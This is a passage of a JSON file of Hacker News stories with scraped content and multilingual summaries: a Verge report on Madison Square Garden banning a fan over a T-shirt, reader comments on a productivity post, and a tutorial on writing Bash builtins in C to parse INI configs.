      "ja": "Tシャツで追放！"
    },
    "type": "story",
    "url": "https://www.theverge.com/news/637228/madison-square-garden-james-dolan-facial-recognition-fan-ban",
    "score": 200,
    "by": "helloworld",
    "time": 1743206895,
    "content": "NewsMadison Square Garden’s surveillance system banned this fan over his T-shirt designAnd he didn’t even wear it to the venue.And he didn’t even wear it to the venue.by  Mia SatoUpdated Mar 29, 2025, 2:10 AM GMT+9LinkFacebookThreadsImage: Getty ImagesMia Sato is platforms and communities reporter with five years of experience covering the companies that shape technology and the people who use their tools.A concert on Monday night at New York’s Radio City Music Hall was a special occasion for Frank Miller: his parents’ wedding anniversary. He didn’t end up seeing the show — and before he could even get past security, he was informed that he was in fact banned for life from the venue and all other properties owned by Madison Square Garden (MSG).After scanning his ticket and promptly being pulled aside by security, Miller was told by staff that he was barred from the MSG properties for an incident at the Garden in 2021. But Miller says he hasn’t been to the venue in nearly two decades.“They hand me a piece of paper letting me know that I’ve been added to a ban list,” Miller says. “There’s a trespass notice if I ever show up on any MSG property ever again,” which includes venues like Radio City, the Beacon Theatre, the Sphere, and the Chicago Theatre.He was baffled at first. Then it dawned on him: this was probably about a T-shirt he designed years ago. MSG Entertainment won’t say what happened with Miller or how he was picked out of the crowd, but he suspects he was identified via controversial facial recognition systems that the company deploys at its venues.In 2017, 1990s New York Knicks star Charles Oakley was forcibly removed from his seat near Knicks owner and Madison Square Garden CEO James Dolan. The high-profile incident later spiraled into an ongoing legal battle. For Miller, Oakley was an “integral” part of the ’90s Knicks, he says. With his background in graphic design, he made a shirt in the style of the old team logo that read, “Ban Dolan” — a reference to the infamous scuffle.A few years later, in 2021, a friend of Miller’s wore a Ban Dolan shirt to a Knicks game and was kicked out and banned from future events. That incident spawned ESPN segments and news articles and validated what many fans saw as a pettiness on Dolan and MSG’s part for going after individual fans who criticized team ownership.But this week, Miller wasn’t wearing a Ban Dolan shirt; he wasn’t even at a Knicks game. His friend who was kicked out for the shirt tagged him in social media posts as the designer when it happened, but Miller, who lives in Seattle, hadn’t attended an event in New York in years.MSG Entertainment advises event goers that they’ll be subject to facial recognition at its venues. Photo: Chris Welch / The VergeMiller says that after he scanned his digital ticket, but before he went through security, a person working at Radio City stopped the line, pulled him aside, and asked him for his ID to verify who he was. They then walked him to another entrance of the building, where five or more staff members stood with him as he was told he was not allowed to return.He’s not sure how exactly MSG connected him to the shirt or a 2021 incident during an event he wasn’t at. Miller told The Verge that until the concert, he had never actually purchased tickets to MSG events — they were either gifts from other people, or he got them through work.“I’ve been reading articles about this facial recognition stuff that Dolan [and] MSG properties use, but I hadn’t been in or around the Garden outside of Penn Station to take New Jersey Transit [to] Newark Airport in almost 20 years now,” Miller says. A friend who was present made sure his parents enjoyed the show while Miller hung out at a bar nearby. He did not get a refund for his ticket, he says.“I just found it comical, until I was told that my mom was crying [in the lobby],” Miller says of the experience. “I was like, ‘Oh man, I ruined their anniversary with my shit talk on the internet. Memes are powerful, and so is the surveillance state.” Miller and his parents also had tickets to a Knicks game the following night; his parents went without him, with a family friend in his place. Miller dropped his parents off from across the street.MSG Entertainment did not respond to The Verge’s questions about whether facial recognition was used to identify Miller.“Frank Miller Jr. made threats against an MSG executive on social media and produced and sold merchandise that was offensive in nature,” Mikyl Cordova, executive vice president of communications and marketing for the company, said in an emailed statement. “His behavior was disrespectful and disruptive and in violation of our code of conduct.”Keeping close watch on patrons is nothing new for MSG. In 2022, a New Jersey attorney was denied entry to Radio City Music Hall during a Girl Scout troop trip. Her infraction was being on an “attorney exclusion list” full of people who work at firms that are suing MSG. The attorney was identified using facial recognition technology at the venue.Miller says he was told at Radio City that he could appeal the ban if he wanted to but said it’s not a priority for him. He hopes his experience can help others who find themselves in a similar situation, where they’re unexpectedly denied entry at an expensive event based on data about them that has been collected by the company.“It’s something that we all have to be aware of — the panopticon,” Miller says. “We’re [being] surveilled at all times, and it’s always framed as a safety thing, when rarely is that the case. It’s more of a deterrent and a fear tactic to try to keep people in line.”Update March 28th: Added comment from MSG Entertainment spokesperson Mikyl Cordova. Clarified to reflect that Frank Miller said he had not been to an event at MSG venues in nearly 20 years.See More: CreatorsCultureEntertainmentNewsSecuritySportsTechMost PopularMost PopularGoogle discontinues Nest Protect smoke alarm and Nest x Yale door lockKing Arthur wants to automate your sourdough starterWindows 11 is closing a loophole that let you skip making a Microsoft accountMadison Square Garden’s surveillance system banned this fan over his T-shirt designHelldivers 2 is locking out players who use older CPUsInstallerA weekly newsletter by David Pierce designed to tell you everything you need to download, watch, read, listen to, and explore that fits in The Verge’s universe.Email (required)Sign UpBy submitting your email, you agree to our Terms and Privacy Notice. This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.Advertiser Content FromThis is the title for the native ad",
    "summary": {
      "en": "Frank Miller was banned for life from Madison Square Garden (MSG) and its venues without even attending a concert. He was informed of the ban when he tried to enter Radio City Music Hall for his parents' anniversary. The ban is linked to a T-shirt he designed years ago that criticized MSG CEO James Dolan, which a friend wore to a Knicks game in 2021, resulting in his ban.\n\nMiller suspects he was identified through MSG's facial recognition technology. He hadn’t been to MSG venues in nearly 20 years and was surprised by the ban. His experience highlights concerns about surveillance and its use against fans. Although he can appeal the ban, he finds it not a priority, emphasizing the need for awareness about surveillance practices.",
      "ko": "프랭크 밀러는 콘서트에 참석하지도 않은 채 매디슨 스퀘어 가든과 그 소속 장소에서 평생 출입 금지를 당했다. 그는 부모님의 기념일을 맞아 라디오 시티 뮤직 홀에 들어가려다 금지 통지를 받았다. 이 금지는 그가 몇 년 전 디자인한 티셔츠와 관련이 있다. 이 티셔츠는 MSG CEO 제임스 돌란을 비판하는 내용이었고, 그의 친구가 2021년 닉스 경기에서 이를 입고 갔다가 밀러가 금지당하는 결과를 초래했다.\n\n밀러는 MSG의 얼굴 인식 기술을 통해 자신이 식별된 것 같다고 의심하고 있다. 그는 거의 20년 동안 MSG 소속 장소에 가지 않았기 때문에 금지 통지에 놀랐다. 그의 경험은 팬들에 대한 감시와 그 사용에 대한 우려를 드러낸다. 그는 금지에 대해 항소할 수 있지만, 이를 우선사항으로 두지 않으며 감시 관행에 대한 인식의 필요성을 강조하고 있다.",
      "ja": "フランク・ミラーは、マディソン・スクエア・ガーデン（MSG）およびその関連施設から生涯にわたる入場禁止を受けましたが、コンサートには一度も参加していませんでした。彼は両親の記念日を祝うためにラジオシティ・ミュージックホールに入ろうとした際に、この禁止措置を知らされました。この禁止は、彼が数年前にデザインしたTシャツに関連しています。このTシャツはMSGのCEOであるジェームズ・ドランを批判する内容で、友人が2021年にニューヨーク・ニックスの試合で着用したことが原因で、ミラーは入場禁止となりました。\n\nミラーは、MSGの顔認識技術によって自分が特定されたのではないかと疑っています。彼は約20年ぶりにMSGの施設に行こうとしたため、この禁止措置には驚いています。彼の体験は、ファンに対する監視の懸念を浮き彫りにしています。禁止に対して異議を申し立てることは可能ですが、彼はそれを優先事項とは考えておらず、監視の実態についての認識を高める必要があると強調しています。"
    }
  },
  {
    "id": "4ecf757c0bc474ad",
    "title": {
      "en": "How I Choose What to Work On (2023)",
      "ko": "내 일의 선택법",
      "ja": "仕事の選び方 (2023)"
    },
    "type": "story",
    "url": "https://tynan.com/workonwhat/",
    "score": 109,
    "by": "freemh",
    "time": 1742903659,
    "content": "Comments\n\n\t\t11 responses to “How I Choose What to Work On”\n\n\t\t\t\t\tAdam Ruggle\n\n\t\t\t\t\t\tOctober 15, 2023\n\n\t\t\t\t\tThanks Tynan, I appreciate hearing more about your mindset and hope you enjoy the extended cruise.\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tAndrew\n\n\t\t\t\t\t\tOctober 18, 2023\n\n\t\t\t\t\tTynan, I appreciate this article as well and getting into your mind set about what you work on. How do you choose what is “worth” the money to trade money for whether it is autonomy, quality of life or other things?\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tGavin\n\n\t\t\t\t\t\tOctober 18, 2023\n\n\t\t\t\t\tMore mindset posts would be appreciated. I was reading a Scott Young (or possibly Cal Newport) article about goal setting, and how he broke it down for a complete beginner was interesting. Good goal setters have such discipline that it’s easy to dismiss the advice to ‘just do it’, because that is what they habitually do (as do their friends and social group).\nI wondered if there were any habits or mindset that you have, that when you meet people outside your social circle, they struggle to comprehend something that you think is normal. I know this is a difficult thing to answer, and you’ve briefly tocuhed on it before in your podcast and others articles (such as you not buying into advertising). Cheers, Gavin.\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tAdam\n\n\t\t\t\t\t\tOctober 19, 2023\n\n\t\t\t\t\tI’d be interested to get an update to this post: https://tynan.com/negative/ considering the current landscape of interest rates (IBKR margin rates are now 7% or more)\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tTynan\n\n\t\t\t\t\t\tOctober 27, 2023\n\n\t\t\t\t\tMight write one, but a quick update: I no longer use margin heavily, except as a buffer against overdrawing my checking account, which allows me to keep more of my money invested. It’s just not right for this high-interest climate. My investments are still the same, though.\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tJR\n\n\t\t\t\t\t\tOctober 20, 2023\n\n\t\t\t\t\tThis is where you have contributed a lot of value to my life and I’m sure the lives of many others – by living and spreading this mindset and a comfort with making unconventional life choices based on certain core principles. You have been an inspiration for many and a trailblazer. That is true ”success”.\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tMads Phikamphon\n\n\t\t\t\t\t\tOctober 23, 2023\n\n\t\t\t\t\tSince you are asking for questions, I would love to hear more about Cruise Sheet. Especially how you have grown/done marketing for Cruise Sheet (I have a site for finding model trains and it’s suffering from me loving programming far more than marketing).\nThanks,\nMads\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tMarc\n\n\t\t\t\t\t\tNovember 13, 2023\n\n\t\t\t\t\tGreat post!\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tAlex\n\n\t\t\t\t\t\tNovember 24, 2023\n\n\t\t\t\t\tNew Kit list ?\n\n\t\t\t\t\tReply\n\n\t\t\t\t\tMiguel Marcos Martinez\n\n\t\t\t\t\t\tDecember 8, 2023\n\n\t\t\t\t\tKevin Kelly nailed it when I heard him say something like “The only productive way to answer what should I do now is to answer the question ‘who should I become’? Succinct and meaningful.\n\n\t\t\t\t\tReply\n\n\t\t\t\t\t我如何选择要干什么 – 偏执的码农\n\n\t\t\t\t\t\tMarch 25, 2025\n\n\t\t\t\t\t[…] 详情参考 […]\n\n\t\t\t\t\tReply\n\n\t\tLeave a Reply Cancel replyYour email address will not be published. Required fields are marked *Comment * Name *\nEmail *\nWebsite\n Save my name, email, and website in this browser for the next time I comment.\n\nΔdocument.getElementById( \"ak_js_1\" ).setAttribute( \"value\", ( new Date() ).getTime() );",
    "summary": {
      "en": "The text discusses responses to an article by Tynan about his decision-making process for choosing what projects to work on. Key points include:\n\n1. **Appreciation for Insight**: Readers express gratitude for Tynan's insights into his mindset and decision-making.\n2. **Value of Choices**: One reader asks how Tynan determines what is worth trading for, such as autonomy or quality of life.\n3. **Desire for More Mindset Content**: Another reader wishes for more posts on mindset, especially about goal setting and habits that differ from mainstream thinking.\n4. **Investment Strategy Update**: Tynan provides a brief update on his investment strategies, stating he now uses margin less due to high-interest rates.\n5. **Inspiration**: A reader praises Tynan for inspiring others through his unconventional life choices.\n6. **Interest in Marketing**: Another reader seeks advice on marketing for their project, expressing a preference for programming over marketing.\n\nOverall, the discussion centers around personal growth, investment strategies, and the value of unconventional approaches.",
      "ko": "독자들은 타이넌의 의사결정 과정에 대한 통찰력에 감사의 뜻을 전했습니다. 한 독자는 타이넌이 자율성이나 삶의 질과 같은 것들 중에서 무엇을 선택할 가치가 있는지 어떻게 판단하는지 궁금해했습니다. 또 다른 독자는 목표 설정과 주류 사고와 다른 습관에 대한 마음가짐에 관한 글을 더 많이 읽고 싶다고 밝혔습니다.\n\n타이넌은 자신의 투자 전략에 대한 간단한 업데이트를 제공하며, 현재 높은 이자율로 인해 마진을 덜 사용하고 있다고 언급했습니다. 한 독자는 타이넌이 비전통적인 삶의 선택을 통해 다른 사람들에게 영감을 주고 있다고 칭찬했습니다. 또 다른 독자는 자신의 프로젝트에 대한 마케팅 조언을 요청하며, 마케팅보다 프로그래밍에 더 관심이 있다고 전했습니다.\n\n전체적으로 이 논의는 개인 성장, 투자 전략, 비전통적인 접근 방식의 가치에 초점을 맞추고 있습니다.",
      "ja": "テキストは、Tynanがどのプロジェクトに取り組むかを決める際の思考過程についての記事に対する反応を紹介しています。主なポイントは以下の通りです。\n\n読者は、Tynanの考え方や意思決定に関する洞察に感謝の意を示しています。一人の読者は、Tynanが自分にとって何が価値があるか、例えば自律性や生活の質をどのように判断しているのかを尋ねています。また、別の読者は、目標設定や主流の考え方とは異なる習慣についてのマインドセットに関する投稿をもっと見たいと希望しています。\n\nTynanは、投資戦略についての簡単な更新を行い、高金利のためにマージンをあまり使用しなくなったと述べています。さらに、ある読者は、Tynanが独自のライフスタイル選択を通じて他の人にインスピレーションを与えていることを称賛しています。別の読者は、自分のプロジェクトのマーケティングについてアドバイスを求めており、マーケティングよりもプログラミングに興味があると表明しています。\n\n全体として、この議論は個人の成長、投資戦略、そして型破りなアプローチの価値に焦点を当てています。"
    }
  },
  {
    "id": "5dfd668acccef666",
    "title": {
      "en": "Writing a Bash builtin in C to parse INI configs",
      "ko": "C로 INI 파서 만들기",
      "ja": "CでINI解析！"
    },
    "type": "story",
    "url": "https://mbuki-mvuki.org/posts/2021-07-12-writing-a-bash-builtin-in-c-to-parse-ini-configs/",
    "score": 26,
    "by": "namanyayg",
    "time": 1743199687,
    "content": "Writing a Bash Builtin in C to Parse INI Configs\n\n          2021-07-12\n\n            Programming\n\n            Bash\n\n             ,\n            Shell\n\n             ,\n            C\n\n    Why Not Just Parse INI Configs With Bash?\n    What is a Bash Builtin?\n    Why Would You Write a Builtin?\n    Minimal Builtin, Implementing sleep\n    Writing an INI Parser Builtin\n\n        Generating Help Output\n        Informing Bash About our Builtin\n        Parsing Options and Reading Stdin\n        Modifying Bash’s Internal State, Injecting Data\n        Building & Testing\n        Let’s Try It!\n\n    Closing Thoughts\n    Further Reading\n    Acknowledgments\n\n      Why Not Just Parse INI Configs With Bash?\nShell languages such as Bash excel at certain tasks, such as gluing\nprograms together or quickly automating a set of command line steps. In\ncontrast to those strengths, using a Shell to parse an\nINI config file is a bit like\nwriting a poem in mud, you might succeed, but the result will probably\nbe inscrutable and your swear\njar will be full! As this\nwonderful Stack Overflow\npost\nattests there are many different ways to parse an INI file in Bash, but\nfew of the answers provided are elegant.\nSo if you have a task poorly suited to Bash, what are your options?\n\nChoose another language for the task? (Perhaps sensible, but not\nalways fun.)\n\nWrite a custom Bash builtin to extend Bash for the task? (Spoiler,\nthis is the route we will choose!)\n\nWhat is a Bash Builtin?\nA builtin is a command in Bash that is implemented in the shell itself,\nrather than as a separate program. They are the batteries included with\nBash. If you type help in Bash you get a list of all the currently\nenabled builtins, or you can use type printf to check if a specific\ncommand is a builtin. Many of the commands you use regularly are\nbuiltins, e.g. echo, printf, and cd. They are typically\nimplemented in the language used to write the shell itself, so in the\ncase of Bash, C. Some of Bash’s builtins are also available as separate\ncommands, depending on how your operating system is configured. For\nexample printf is a Bash builtin, but it is also usually available on\na Linux box as a separate program, try which printf to find out.\nBuiltins are preferred in Bash over external programs, as if they were\nplaced first in your PATH. Bash also allows you to write your own\ncustom builtins and load them into the shell, as does Zsh and the\nKornShell.\nWhy Would You Write a Builtin?\n\nWhy are builtins helpful?\nWhy not just rely entirely on external commands?\n\nYou could build a shell with a minimal set of builtins, but certain\nbuiltins are still necessary. For example the cd command must be a\nbuiltin, since calling chdir(2) in a forked process will have no\neffect on the parent shell process. The shell must execute the cd and\nthus the chdir(2) call in its own process. There are at least three\ncases, including the cd example, where builtins are necessary or\nuseful:\n\nAvoiding the need to fork an external process.\n\nCalling a system function that affects the shell process itself,\ne.g. chdir(2).\n\nModifying a shell’s internal state, e.g. adding a variable.\n\nOur INI config parser builtin will demonstrate the utility of reason\nnumber (3). However, before we implement that builtin, let us try\nimplementing sleep as a builtin. Implementing sleep is a custom\nbuiltin challenge akin to printing Hello World! in a new language.\nMinimal Builtin, Implementing sleep\nEveryone needs sleep, but it can be costly in Bash. We had a program\nthat ironically slowed down after a\nspinner was\nadded to provide feedback to the user that the program was still\nrunning. The spinner called sleep 0.04 in a loop while printing the\nspinner characters to the screen. The creation of 25 forked processes\nper second actually slowed down the program! Bash does have a sleep\nbuiltin, but it is not enabled by default, let’s create a simple\nimplementation:\ncopy#include \"builtins.h\"\n#include \"shell.h\"\n#include \"bashgetopt.h\"\n#include \"common.h\"\n#include <errno.h>\n\nchar *sleep_doc[] = {\"Patience please, wait for a bit!\", NULL};\n\nint sleep_builtin(WORD_LIST *list) {\n  if (!list) {\n    builtin_usage();\n    return EX_USAGE;\n  }\n  char *endptr;\n  char *secs_arg = list->word->word;\n  uintmax_t secs = strtoumax(list->word->word, &endptr, 10);\n  if ((secs == UINTMAX_MAX && errno == ERANGE) || (*endptr != '\\0')) {\n    builtin_error(\"Unable to convert `%s` to an integer\", secs_arg);\n    return EXECUTION_FAILURE;\n  }\n  unsigned int rem = sleep(secs);\n  if (rem == 0) {\n    return EXECUTION_SUCCESS;\n  } else {\n    builtin_error(\"Sleep interrupted, %d secs remaining\", rem);\n    return EXECUTION_FAILURE;\n  }\n}\n\n/* Provides Bash with information about the builtin */\nstruct builtin sleep_struct = {\n    .name = \"sleep\",             /* Builtin name */\n    .function = sleep_builtin,   /* Function implementing the builtin */\n    .flags = BUILTIN_ENABLED,    /* Initial flags for builtin */\n    .long_doc = sleep_doc,       /* Array of long documentation strings. */\n    .short_doc = \"sleep NUMBER\", /* Usage synopsis; becomes short_doc */\n    .handle = 0                  /* Reserved for internal use */\n};\nThe struct builtin is what informs Bash about our builtin. Notably we\nprovide a function here, sleep_builtin, which is essentially our\nbuiltin’s main. This function is supplied with any args provided to\nour builtin. In our sleep_builtin function we check if we have an arg,\nif so, we try to convert the arg to an integer and sleep(3) for that\nnumber of seconds. Let’s try it out:\ncopy$ enable -f ./sleep.so sleep\n$ help sleep\nsleep: sleep NUMBER\n    Patience please, wait for a bit!\n$ time sleep 1\nreal    0m1.000s\nuser    0m0.000s\nsys 0m0.000s\n$ sleep ⏰\nbash: sleep: Unable to convert `⏰` to an integer\nFabulous, so with a small amount of code and minimal boilerplate we have\ncreated a dynamically loaded Bash builtin! The sleep builtin satisfies\nreason number (1) on why you might write a builtin by eliminating the\nneed to fork a process for each sleep execution. With sleep as a\nbuiltin each call is a function call rather than a process fork(2),\ni.e. bring back the spinner! But, it does not satisfy reason number\n(3), changing Bash’s internal state. Let’s implement an INI parser to\nsatisfy reason number (3) and provide a more complete example of\ncreating a Bash builtin.\nWriting an INI Parser Builtin\nGenerating Help Output\nFirst we’ll create our help ini doc which provides the builtin\ndocumentation inside of Bash. This help text provides an overview of how\nour INI parser will affect Bash’s state:\ncopychar *ini_doc[] = {\n    \"Reads an INI config from stdin input into a set of associative arrays.\",\n    \"\",\n    \"Reads an INI config from stdin input into a set of associative arrays.\",\n    \"The sections of the INI config are added to an associative array\",\n    \"specified by the `-a TOC` argument. The keys and values are then added to\",\n    \"associative arrays prefixed by the `TOC` name and suffixed by their INI\",\n    \"section name, `<TOC>_<INI_SECTION_NAME>`. The parsed INI section names\",\n    \"must be valid Bash variable names, otherwise an error is returned.\",\n    \"\",\n    \"Example:\",\n    \"\",\n    \"  Input input.ini:\",\n    \"    [sec1]\",\n    \"    foo = bar\",\n    \"\",\n    \"    [sec2]\",\n    \"    biz = baz\",\n    \"\",\n    \"  Result:\",\n    \"    $ ini -a conf < input.ini\",\n    \"    $ declare -p conf\",\n    \"    declare -A conf=([sec1]=\\\"true\\\" [sec2]=\\\"true\\\" )\",\n    \"    $ declare -p conf_sec1\",\n    \"    declare -A conf_sec1=([foo]=\\\"bar\\\" )\",\n    \"    $ declare -p conf_sec2\",\n    \"    declare -A conf_sec2=([biz]=\\\"baz\\\" )\",\n    \"\",\n    \"If the `-u FD` argument is passed the INI config is read from the `FD`\",\n    \"file descriptor rather than from stdin. Variables are created with local\",\n    \"scope inside a function unless the `-g` option is specified.\",\n    NULL};\nInforming Bash About our Builtin\ncopystruct builtin ini_struct = {\n    .name = \"ini\",            /* Builtin name */\n    .function = ini_builtin,  /* Function implementing the builtin */\n    .flags = BUILTIN_ENABLED, /* Initial flags for builtin */\n    .long_doc = ini_doc,      /* Array of long documentation strings. */\n    .short_doc =\n        \"ini -a TOC [-u FD] [-g]\", /* Usage synopsis; becomes short_doc */\n    .handle = 0                    /* Reserved for internal use */\n};\nAs we did with the sleep builtin we initialize a struct builtin that\nincludes our ini_doc array as well as our short doc string. The second\nmember of the struct is the sh_builtin_func_t which is the main\nfunction of our builtin.\nParsing Options and Reading Stdin\nBash provides an internal_getopt function which is akin to\ngetopt(3), but uses Bash’s internal WORD_LIST structure. We parse\nour mandatory argument -a for the name of the associative array which\nwill contain our INI section names. We parse our optional -u argument\nwhich specifies an alternative file\ndescriptor to read from\nrather than the default of stdin. Once we have our file descriptor we\ncall fdopen(3) to obtain a FILE stream structure which we pass to\nour INI parser.\ncopyint ini_builtin(WORD_LIST *list) {\n  intmax_t intval;\n  int opt, code;\n  int fd = 0;\n  bool global_vars = false;\n  char *toc_var_name = NULL;\n  reset_internal_getopt();\n  while ((opt = internal_getopt(list, \"a:gu:\")) != -1) {\n    switch (opt) {\n    case 'a':\n      toc_var_name = list_optarg;\n      break;\n    case 'g':\n      global_vars = true;\n      break;\n    case 'u':\n      code = legal_number(list_optarg, &intval);\n      if (code == 0 || intval < 0 || intval != (int)intval) {\n        builtin_error(\"%s: invalid file descriptor specification\", list_optarg);\n        return EXECUTION_FAILURE;\n      }\n      fd = (int)intval;\n      if (sh_validfd(fd) == 0) {\n        builtin_error(\"%d: invalid file descriptor: %s\", fd, strerror(errno));\n        return EXECUTION_FAILURE;\n      }\n      break;\n    case GETOPT_HELP:\n      builtin_help();\n      return EX_USAGE;\n    default:\n      builtin_usage();\n      return EX_USAGE;\n    }\n  }\n  if (!toc_var_name) {\n    builtin_usage();\n    return EX_USAGE;\n  }\n  FILE *file = fdopen(fd, \"r\");\n  if (!file) {\n    builtin_error(\"%d: unable to open file descriptor: %s\", fd,\n                  strerror(errno));\n    return EXECUTION_FAILURE;\n  }\n  /* snip */\n}\nModifying Bash’s Internal State, Injecting Data\nThe INI builtin creates a TOC or table of contents associative array\nspecifying which INI sections were found. Then for each INI section it\ncreates a <TOC>_<INI_SECTION_NAME> associative array. First we create\nthe TOC var:\ncopy/* snip */\nini_conf conf = {};\nconf.toc_var_name = toc_var_name;\nif (variable_context && !global_vars) {\n  conf.local_vars = true;\n} else {\n  conf.local_vars = false;\n}\nSHELL_VAR *toc_var = NULL;\nif (conf.local_vars) {\n  int vflags = 0;\n  toc_var = make_local_assoc_variable(toc_var_name, vflags);\n} else {\n  toc_var = make_new_assoc_variable(toc_var_name);\n}\nif (!toc_var) {\n  builtin_error(\"Could not make %s\", toc_var_name);\n  return EXECUTION_FAILURE;\n}\nif (ini_parse_file(file, handler, &conf) < 0) {\n  builtin_error(\"Unable to read from fd: %d\", fd);\n  return EXECUTION_FAILURE;\n}\nreturn EXECUTION_SUCCESS;\n/* snip */\nWe check Bash’s variable_context to see if it is greater than zero\nwhich indicates we are in a function. If we are in a function we create\nlocal variables, unless the -g option was passed to our builtin. We\nthen setup our config for our INI parser. Bash provides functions to\ncreate local, make_local_assoc_variable and global variables,\nmake_new_assoc_variable. Once we have created our TOC variable we\ncall the ini_parse_file function with our file, config, and handler\nfunction. We are using the excellent\ninih library to do the complicated\nparsing of the INI, but we do need to implement the inih handler\nfunction:\ncopy/* This is the inih handler called for every new section and for every name and\n * value in a section. This function creates and populates our associative\n * arrays in Bash. Both for the TOC array as well as for the individual section\n * arrays, <TOC>_<INI_SECTION_NAME> */\nstatic int handler(void *user, const char *section, const char *name,\n                   const char *value) {\n  ini_conf *conf = (ini_conf *)user;\n  char *toc_var_name = conf->toc_var_name;\n  /* Create <TOC>_<INI_SECTION_NAME> */\n  char *sep = \"_\";\n  size_t sec_size = strlen(toc_var_name) + strlen(section) + strlen(sep) +\n                    1; // +1 for the NUL character\n  char *sec_var_name = xmalloc(sec_size);\n  char *sec_end = sec_var_name + sec_size - 1;\n  char *p = memccpy(sec_var_name, toc_var_name, '\\0', sec_size);\n  if (!p) {\n    builtin_error(\"Unable to create section name\");\n    return 0;\n  }\n  p = memccpy(p - 1, sep, '\\0', sec_end - p + 2);\n  if (!p) {\n    builtin_error(\"Unable to create section name\");\n    return 0;\n  }\n  p = memccpy(p - 1, section, '\\0', sec_end - p + 2);\n  if (!p) {\n    builtin_error(\"Unable to create section name\");\n    return 0;\n  }\n  if (!legal_identifier(sec_var_name)) {\n    sh_invalidid(sec_var_name);\n    free(sec_var_name);\n    return 0;\n  }\n  /* New section parsed */\n  if (!name && !value) {\n    SHELL_VAR *toc_var = find_variable(toc_var_name);\n    if (!toc_var) {\n      free(sec_var_name);\n      builtin_error(\"Could not find %s\", toc_var_name);\n      return 0;\n    }\n    bind_assoc_variable(toc_var, toc_var_name, strdup(section), \"true\", 0);\n    SHELL_VAR *sec_var = NULL;\n    if (conf->local_vars) {\n      int vflags = 0;\n      sec_var = make_local_assoc_variable(sec_var_name, vflags);\n    } else {\n      sec_var = make_new_assoc_variable(sec_var_name);\n    }\n    if (!sec_var) {\n      builtin_error(\"Could not make %s\", sec_var_name);\n      free(sec_var_name);\n      return 0;\n    }\n    free(sec_var_name);\n    return 1;\n  }\n  if (!name) {\n    free(sec_var_name);\n    builtin_error(\"Malformed ini, name is NULL!\");\n    return 0;\n  }\n  if (!value) {\n    free(sec_var_name);\n    builtin_error(\"Malformed ini, value is NULL!\");\n    return 0;\n  }\n  SHELL_VAR *sec_var = find_variable(sec_var_name);\n  bind_assoc_variable(sec_var, sec_var_name, strdup(name), strdup(value), 0);\n  free(sec_var_name);\n  return 1;\n}\nIn the handler we create our sec_var_name or\n<TOC>_<INI_SECTION_NAME> string. Then if the handler was called at the\nstart of a new section we create an associative array for that section.\nOtherwise, we use Bash’s find_variable function to retrieve our\nexisting variable. Once we have our variable, Bash provides functions to\nalter a variable’s value. Here we use bind_assoc_variable to populate\nan entry in our associative array with the name and value from the INI\nparser. With our handler function complete our Bash builtin is ready to\nparse some INI configs.\nBuilding & Testing\nWe put together a little Makefile to build and test our builtins:\ncopySHELL=/bin/bash\nCC:=gcc\nCFLAGS:=-c -Wall -Wextra -fPIC\nBASH_FLAGS:=$(shell pkgconf --cflags bash)\nLDFLAGS:=--shared\nINIH_FLAGS:=-DINI_CALL_HANDLER_ON_NEW_SECTION=1 -DINI_STOP_ON_FIRST_ERROR=1 \\\n    -DINI_USE_STACK=0\n\nini.so: inih/ini.o\n\n%.so: %.o\n    $(CC) -o $@ $^ $(LDFLAGS)\n\n%.o: %.c\n    $(CC) $(CFLAGS) -o $@ $^\n\ninih/ini.o: CFLAGS += $(INIH_FLAGS)\nini.o: CFLAGS += $(BASH_FLAGS)\nsleep.o: CFLAGS += $(BASH_FLAGS)\n\ninih/ini.c:\n    git submodule update --init\n\n.PHONY: test\ntest: ini.so\n    ./test\n    @echo Tests Passed\n\n.PHONY: clean\nclean:\n    shopt -s globstar; rm -f **/*.o **/*.so\nHere we compile our ini.c file as well as the inih library, then we\nlink them together into a shared library. Our testing methodology is\nrudimentary, we have a Bash script which exercises the features of our\nbuiltin and we compare its output against a canonical copy:\ncopy#!/bin/bash\n\nset -o errexit\nset -o nounset\n\nnew=$(mktemp)\nbash test.sh >\"$new\"\ndiff -u test_output \"$new\"\nLet’s Try It!\nNow that we have compiled and tested our INI builtin, let’s feed it a\nconfig for a fictional RSS reader and see how it performs.\ncopy$ enable -f ./ini.so ini\n$ ini -a rss_conf <<'EOF'\n > [Computers]\n > Vidar's Blog = http://www.vidarholen.net/contents/blog/?feed=rss2\n > Two-Bit History = https://twobithistory.org/feed.xml\n > www.linusakesson.net = http://www.linusakesson.net/rssfeed.php\n >\n > [Comics]\n > xkcd = http://xkcd.com/rss.xml\n >\n > [Books]\n > The Marlowe Bookshelf = http://themarlowebookshelf.blogspot.com/feeds/posts/default\n > EOF\n$ for section_name in \"${!rss_conf[@]}\"; do\n >   printf '## %s\\n' \"$section_name\"\n >   declare -n section='rss_conf_'\"$section_name\"\n >   for key in \"${!section[@]}\"; do\n >     printf ' - %s: %s\\n' \"$key\" \"${section[$key]}\"\n >   done\n > done\n## Books\n - The Marlowe Bookshelf: http://themarlowebookshelf.blogspot.com/feeds/posts/default\n## Comics\n - xkcd: http://xkcd.com/rss.xml\n## Computers\n - www.linusakesson.net: http://www.linusakesson.net/rssfeed.php\n - Two-Bit History: https://twobithistory.org/feed.xml\n - Vidar's Blog: http://www.vidarholen.net/contents/blog/?feed=rss2\nOur TOC var rss_conf holds our section names, then we use Bash’s\nnameref functionality to point a variable to each associative array for\na given INI section from the rss_conf associative array and iterate\nover the section associative arrays. We have the RSS config loaded into\nour Bash program, now we just need to build the application to consume\nit!\nClosing Thoughts\nBash builtins provide a number of positive features. They provide an\ninteresting avenue for extending Bash to perform tasks which are perhaps\npoorly suited to be written in the Bash language itself. Builtins also\nallow Bash to leverage the vast quantity of well tested and established\nC libraries. Lastly, as was hopefully demonstrated in the examples, Bash\nprovides a good framework for builtins and a set of functions that makes\nmodifying Bash’s internal state straightforward.\nGiven the positives of Bash builtins, why aren’t there\nmore\nof them? There are two possibilities that stand out:\n\nThe intersection of people that write Bash and C is rather small?\nThe distribution of custom Bash builtins is not well paved, limiting\ntheir utility?\n\nThe second possibility rings the most true to me, I would love to see\ninnovation and improvement on the use and distribution of Bash builtins.\nIdeally you could enable your builtins and they would be fetched along\nwith your main script and packed into a single 